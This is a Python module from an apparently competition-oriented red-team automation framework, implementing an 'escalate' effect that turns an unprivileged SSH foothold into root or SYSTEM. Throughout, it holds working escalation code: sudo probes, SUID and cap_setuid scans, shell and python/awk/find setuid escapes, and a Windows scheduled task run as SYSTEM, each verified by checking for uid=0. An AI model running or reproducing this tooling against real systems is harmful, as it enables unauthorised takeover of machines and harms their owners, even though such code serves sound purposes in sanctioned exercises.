"""escalate — discover HOW root/SYSTEM is reachable on a box, then take it over."""

import json
import re
import shlex

from ..errors import GuardrailError, PolicyError
from . import artifactnames as names
from .base import Effect, Result, can_root, register, root_cmd

# weakest assumption first: clean wins, then the planted binaries
FAMILIES = ("sudo", "sudo_pw", "suid", "capexec")

# a hint changes what we prefer, never what we are willing to try
HINT_ORDERS = {
    "sudo": ("sudo", "sudo_pw", "suid", "capexec"),
    "sudo_pw": ("sudo_pw", "sudo", "suid", "capexec"),
    # nakon's `capexec:pending-discovery` covers the suid-* families too
    "escape": ("suid", "capexec", "sudo", "sudo_pw"),
    "capexec": ("suid", "capexec", "sudo", "sudo_pw"),
}

# ONE shell token: root_cmd appends it to the label's prefix, and `bash -p -c id`
# / `python3 -c id` only behave with a bare word; `id` reports the effective uid.
PROOF_CMD = "id"
UID0_RE = re.compile(r"(?:^|\s)e?uid=0(?:\(|\s|$)")

SUDO_DIAG = "sudo -n -l 2>&1"
SUID_SCAN = "find / -xdev -perm -4000 -type f 2>/dev/null | head -40"
CAP_SCAN = ("command -v getcap >/dev/null 2>&1 && getcap -r / 2>/dev/null "
            "| grep -i cap_setuid | head -10")

# binaries usable as a command PREFIX (`<prefix> <cmd>`, what root_cmd needs)
SHELL_SUFFIX = {"bash": "-p -c", "sh": "-p -c", "dash": "-p -c", "ksh": "-p -c",
                "zsh": "-p -c", "env": "/bin/sh -p -c"}
SHELL_ORDER = ("bash", "sh", "dash", "ksh", "zsh", "env")

# escapes that embed the command in their own argument: usable one-shot,
# never as a routing label
ONE_SHOT = ("find", "python3", "python2", "python", "awk", "gawk", "mawk", "nawk",
            "perl")

# a box with no root path never acquires one from us: stop burning discovery calls
FAILURE_LIMIT = 3


def basename(path):
    return str(path or "").strip().rsplit("/", 1)[-1]


def short(text, limit=160):
    return " ".join(str(text or "").split())[:limit]


def redact(cmd, secret):
    """Never let a credential into a result, the audit log or the report."""
    if secret:
        return str(cmd).replace(secret, "<pw>")
    return cmd


def labelled(fh, label):
    probe = dict(fh or {})
    probe["escalation"] = label
    return probe


def one_shot_cmd(path, inner):
    name = basename(path)
    if name.startswith("python"):
        payload = f"import os; os.setuid(0); os.system({json.dumps(inner)})"
        return f"{path} -c {shlex.quote(payload)}"
    if name in ("awk", "gawk", "mawk", "nawk"):
        return f"{path} {shlex.quote('BEGIN{system(%s)}' % json.dumps(inner))}"
    if name == "find":
        return f"{path} / -maxdepth 0 -exec /bin/sh -p -c {shlex.quote(inner)} \\;"
    return None


@register
class Escalate(Effect):
    id = "escalate"
    name = "root/SYSTEM label discovery + takeover"
    description = ("On a box where we hold an unprivileged foothold, discover HOW root "
                   "is reachable and prove it: passwordless sudo (label sudo), sudo "
                   "with the foothold password (sudo_pw), a SUID escape binary "
                   "(escape:*), a cap_setuid binary (capexec:*), or — on Windows, "
                   "from an Administrator session — a one-shot SYSTEM task (system). "
                   "The label is only recorded once the shared root_cmd wrapper has "
                   "returned uid=0, so every later root command rides a path that "
                   "works. A box already at the top is a no-op success; a box whose "
                   "only path is a one-shot escape (SUID find/python3/awk) is reported "
                   "as reachable-but-not-routable rather than mislabelled.")
    params = {
        "ip": {"type": "str", "required": True, "desc": "target box"},
        "mechanism": {"type": "enum", "choices": ["auto", *FAMILIES, "system"],
                      "desc": "pin one mechanism family (default auto: discover)"},
    }
    tags = frozenset({"access"})
    needs = {"foothold": True, "root": False, "c2": False, "os": "any"}

    def check(self, ctx, params):
        super().check(ctx, params)
        ip = params["ip"]
        fh = ctx.world.foothold(ip)
        if self._windows(ctx, ip, fh) and not self._admin_equivalent(fh):
            raise PolicyError(f"escalate needs an Administrator foothold on {ip} — "
                              "only an admin-equivalent session reaches SYSTEM there")
        if not can_root(fh) and ctx.world.failure_count(self.id, ip) >= FAILURE_LIMIT:
            raise PolicyError(f"escalate already failed {FAILURE_LIMIT}x on {ip} — no "
                              "routable root path there (see the box's notes)")

    def run(self, ctx, params):
        ip = params["ip"]
        fh = ctx.world.foothold(ip)
        if not fh:
            return Result(False, f"no foothold on {ip} — spray or re-establish first")
        notes = []
        if self._windows(ctx, ip, fh):
            result = self._windows_run(ctx, ip, fh, notes)
        else:
            result = self._linux_run(ctx, ip, fh, notes, params.get("mechanism") or "auto")
        for line in notes:
            ctx.world.note(ip, f"escalate: {line}")
        return result

    def _windows(self, ctx, ip, fh):
        return bool((fh or {}).get("windows")) or ctx.is_windows(ip)

    def _admin_equivalent(self, fh):
        return bool(can_root(fh) or str((fh or {}).get("user", "")).lower()
                    in ("administrator", "admin"))

    def _ssh(self, ctx, ip, fh, cmd, notes, timeout=60):
        try:
            return ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", cmd,
                               timeout=timeout, windows=self._windows(ctx, ip, fh),
                               key_path=fh.get("key_path"))
        except GuardrailError:
            raise
        except AssertionError:
            # winexec's quoting invariant: a bug in OUR command shape, not a box failure
            raise
        except Exception as exc:
            notes.append(f"transport error on {short(cmd, 60)!r}: "
                         f"{type(exc).__name__}: {short(exc, 120)}")
            return None

    def _prove(self, ctx, ip, fh, label, notes, timeout=45):
        """Run the label's OWN root_cmd wrapper for `id`: byte-for-byte what every
        later root command will produce. This is the whole point of the effect."""
        cmd = root_cmd(PROOF_CMD, labelled(fh, label))
        safe = redact(cmd, fh.get("password"))
        res = self._ssh(ctx, ip, fh, cmd, notes, timeout=timeout)
        if res is None:
            return False, safe, "no answer from the box"
        rc, out, err = res
        if rc == 0 and UID0_RE.search(out or ""):
            return True, safe, short((out or "").strip().splitlines()[-1] if
                                     (out or "").strip() else "uid=0")
        return False, safe, f"rc={rc} {short(err or out)}"

    def _withdraw(self, ctx, ip, fh, label, notes):
        """A stale label is a string predicate that keeps routing broken wrappers;
        withdrawing it turns silent corruption into a loud rejection."""
        ctx.world.add_foothold(ip, fh.get("user"), fh.get("password") or "", "user",
                               windows=bool(fh.get("windows")),
                               key_path=fh.get("key_path"), escalation="")
        notes.append(f"withdrew stale label {label!r} on {ip} — it no longer proves "
                     "root, and can_root() must not route through it")

    def _linux_run(self, ctx, ip, fh, notes, mechanism):
        hint = (ctx.intel.hints_for(ip) or {}).get("escalation")
        if hint:
            notes.append(f"intel hint: escalation label {hint!r}")

        if can_root(fh) and fh.get("escalation"):
            label = fh["escalation"]
            ok, cmd, why = self._prove(ctx, ip, fh, label, notes, timeout=30)
            if ok:
                notes.append(f"no-op: {label} still proves root")
                return Result(True, f"{label} re-verified on {ip} — already root-capable",
                              data={"label": label, "probe": cmd, "notes": notes})
            notes.append(f"standing label {label} no longer proves root ({why})")
            self._withdraw(ctx, ip, fh, label, notes)
            fh = ctx.world.foothold(ip) or fh
        elif can_root(fh):
            notes.append(f"no-op: the foothold user on {ip} is already root "
                         "(no wrapper needed)")
            return Result(True, f"already root on {ip} — nothing to escalate",
                          data={"label": None, "notes": notes})

        order = self._order(hint)
        if mechanism != "auto":
            order = (mechanism,)
            if mechanism == "system":
                return Result(False, f"mechanism=system is Windows-only (use system "
                                     f"on an Administrator foothold, not {ip})",
                              data={"notes": notes})
        verdicts = []
        for family in order:
            label, cmd, verdict = getattr(self, f"_try_{family}")(ctx, ip, fh, notes)
            verdicts.append(verdict)
            if label:
                ctx.world.elevate_foothold(ip, label)
                notes.append(verdict)
                return Result(True, f"{label} proved root on {ip}",
                              data={"label": label, "probe": cmd, "family": family,
                                    "notes": notes},
                              restore=self._linux_restore(ip, label))
        notes.append("nothing routable found")
        return Result(False, f"no escalation label applies on {ip}: "
                             + " | ".join(verdicts),
                      data={"label": None, "notes": notes})

    def _order(self, hint):
        if not hint:
            return FAMILIES
        text = str(hint)
        if text.startswith(("escape:", "capexec:")):
            key = "capexec" if text.startswith("capexec:") else "escape"
            return HINT_ORDERS[key]
        return HINT_ORDERS.get(text, FAMILIES)

    def _linux_restore(self, ip, label):
        return {"recipe": [
            "true  # escalate changes no file on the box: the label routes a "
            "privilege path the competition already planted (nothing installed, "
            "moved or deleted)",
            f"# withdraw on red's side only: clear the escalation field of the "
            f"foothold record for {ip} (label {label})",
        ], "secrets": None}

    def _try_sudo(self, ctx, ip, fh, notes):
        ok, cmd, why = self._prove(ctx, ip, fh, "sudo", notes)
        if ok:
            notes.append(f"passwordless sudo on {ip} (proved by {cmd!r})")
            return "sudo", cmd, "passwordless sudo -> root"
        notes.append(f"passwordless sudo did not return root ({why})")
        res = self._ssh(ctx, ip, fh, SUDO_DIAG, notes, timeout=30)
        if res is not None:
            rc, out, err = res
            notes.append(f"sudo -l says: {short(out or err) or f'rc={rc}'}")
        return None, None, "sudo: no passwordless root"

    def _try_sudo_pw(self, ctx, ip, fh, notes):
        if not (fh.get("password") or ""):
            return None, None, "sudo_pw: no password held for the foothold account"
        ok, cmd, why = self._prove(ctx, ip, fh, "sudo_pw", notes)
        if ok:
            notes.append(f"sudo accepts the foothold password on {ip} (proved by "
                         f"{cmd!r})")
            return "sudo_pw", cmd, "sudo with the foothold password -> root"
        notes.append(f"the foothold password does not open sudo ({why})")
        return None, None, "sudo_pw: password sudo refused"

    def _try_suid(self, ctx, ip, fh, notes):
        res = self._ssh(ctx, ip, fh, SUID_SCAN, notes, timeout=90)
        if res is None:
            return None, None, "suid: scan failed"
        rc, out, err = res
        paths = [line.strip() for line in (out or "").splitlines() if line.strip()]
        if not paths:
            return None, None, "suid: no set-uid binary found"
        notes.append(f"set-uid binaries on {ip}: {short(', '.join(paths), 300)}")

        # shell clone is a command prefix (routable); one-shot escapes cannot be
        # re-run by the router, so they are never labelled
        shells = sorted((p for p in paths if basename(p) in SHELL_SUFFIX),
                        key=lambda p: (SHELL_ORDER.index(basename(p)), p))
        for path in shells:
            name = basename(path)
            label = f"escape:{path} {SHELL_SUFFIX[name]}"
            ok, cmd, why = self._prove(ctx, ip, fh, label, notes)
            if ok:
                notes.append(f"SUID {name} at {path} -> root (label {label!r})")
                self._note_other_escapes(paths, notes)
                return label, cmd, f"set-uid {name} -> root"
            notes.append(f"SUID {name} at {path} did not return root ({why})")

        one_shot = self._one_shot_root(ctx, ip, fh, paths, notes)
        if one_shot:
            return None, None, (f"suid: no routable SUID escape, but the one-shot "
                                f"escape {one_shot} proves root")
        return None, None, "suid: no usable set-uid escape"

    def _note_other_escapes(self, paths, notes):
        """Binaries NOT taken over are evidence, not silence."""
        others = [p for p in paths if basename(p) in ONE_SHOT]
        if others:
            notes.append("also present (one-shot escapes, not routable — improvise "
                         "can use them): " + short(", ".join(sorted(others)), 200))

    def _one_shot_root(self, ctx, ip, fh, paths, notes):
        """Prove (never label) escapes that embed the command in their argument."""
        for path in sorted(p for p in paths if basename(p) in ONE_SHOT):
            cmd = one_shot_cmd(path, PROOF_CMD)
            if cmd is None:
                continue
            res = self._ssh(ctx, ip, fh, cmd, notes, timeout=45)
            if res is None:
                continue
            rc, out, err = res
            if rc == 0 and UID0_RE.search(out or ""):
                notes.append(f"one-shot escape {basename(path)} at {path} PROVES root "
                             "but is not routable as a label (the command must be "
                             "embedded; the shared router appends it) — improvise can "
                             "use it")
                return f"{basename(path)} at {path}"
            notes.append(f"one-shot escape {path} did not return root "
                         f"({short(err or out) or f'rc={rc}'})")
        return None

    def _try_capexec(self, ctx, ip, fh, notes):
        res = self._ssh(ctx, ip, fh, CAP_SCAN, notes, timeout=90)
        if res is None:
            return None, None, "capexec: scan failed"
        rc, out, err = res
        paths = []
        for line in (out or "").splitlines():
            if "cap_setuid" in line and line.split():
                paths.append(line.split()[0])
        if not paths:
            return None, None, "capexec: no cap_setuid binary found"
        notes.append(f"cap_setuid binaries on {ip}: {short(', '.join(paths), 300)}")

        for path in paths:
            name = basename(path)
            shapes = [f"capexec:{path}"]
            if name in SHELL_SUFFIX:
                shapes.insert(0, f"capexec:{path} {SHELL_SUFFIX[name]}")
            for label in shapes:
                ok, cmd, why = self._prove(ctx, ip, fh, label, notes)
                if ok:
                    notes.append(f"cap_setuid {path} -> root (label {label!r})")
                    return label, cmd, f"cap_setuid binary {name} -> root"
                notes.append(f"cap_setuid {path} as {label!r} did not return root ({why})")
            cmd = one_shot_cmd(path, PROOF_CMD)
            if cmd is None:
                notes.append(f"cap_setuid {path} has no known invocation shape — "
                             "not routable (improvise can try it)")
                continue
            res = self._ssh(ctx, ip, fh, cmd, notes, timeout=45)
            if res is None:
                continue
            rc, out, err = res
            if rc == 0 and UID0_RE.search(out or ""):
                notes.append(f"cap_setuid {path} PROVES root with an embedded payload "
                             "but is not routable as a label (see the notes above)")
                return None, None, (f"capexec: cap_setuid at {path} proves root "
                                    "one-shot only")
        return None, None, "capexec: cap_setuid found but none routable"

    def _windows_run(self, ctx, ip, fh, notes):
        if fh.get("escalation") == "system":
            notes.append("no-op: escalation=system already recorded")
            return Result(True, f"already SYSTEM on {ip} — the system label stands",
                          data={"label": "system", "notes": notes})
        if not self._admin_equivalent(fh):
            return Result(False, f"{fh.get('user')} on {ip} is not admin-equivalent — "
                                 "no escalation path exists",
                          data={"notes": notes})

        drawn = names.windows_names(ctx.world, rng=ctx.rng,
                                   mode=names.mode_from_cfg(ctx.cfg))
        task, out_name = drawn["task"], drawn["log_task"]
        out_file = f"C:\\Windows\\Temp\\{out_name}.txt"
        script = (
            f"schtasks /Create /TN '{task}' /TR 'cmd /c whoami > {out_file}' "
            f"/SC ONCE /ST 23:59 /RU SYSTEM /F; "
            f"schtasks /Run /TN '{task}' | Out-Null; Start-Sleep -Seconds 3; "
            f"$out = (Get-Content {out_file} -ErrorAction SilentlyContinue) -join ' '; "
            f"schtasks /Delete /TN '{task}' /F | Out-Null; "
            f"Remove-Item {out_file} -ErrorAction SilentlyContinue; "
            "if ($out -match 'SYSTEM') { Write-Output 'SYSTEM-OK' } "
            "else { Write-Output 'SYSTEM-FAIL' }")
        res = self._ssh(ctx, ip, fh, script, notes, timeout=90)
        if res is None:
            return Result(False, f"one-shot SYSTEM task on {ip}: no answer",
                          data={"notes": notes})
        rc, out, err = res
        if rc != 0:
            return Result(False, f"SYSTEM task rc={rc}: {short(err or out)}",
                          data={"notes": notes})
        if "SYSTEM-OK" not in (out or ""):
            notes.append(f"the SYSTEM task did not confirm: {short(out)[-120:]}")
            return Result(False, f"the one-shot SYSTEM task did not confirm on {ip}",
                          data={"notes": notes})

        ctx.world.elevate_foothold(ip, "system")
        notes.append(f"one-shot scheduled task {task!r} ran as SYSTEM -> "
                     "nt authority\\system (escalation=system); task and output file "
                     "removed in the same run")
        return Result(True, f"SYSTEM obtained on {ip} (one-shot scheduled task {task})",
                      data={"label": "system", "task": task, "notes": notes},
                      restore=self._windows_restore(task, out_file))

    def _windows_restore(self, task, out_file):
        return {"recipe": [
            # idempotent: both are already gone; recorded so the organizer's table
            # is complete and a re-run can't leave the one-shot task behind
            f"schtasks /Delete /TN '{task}' /F",
            f"Remove-Item -Path '{out_file}' -ErrorAction SilentlyContinue",
        ], "secrets": None}
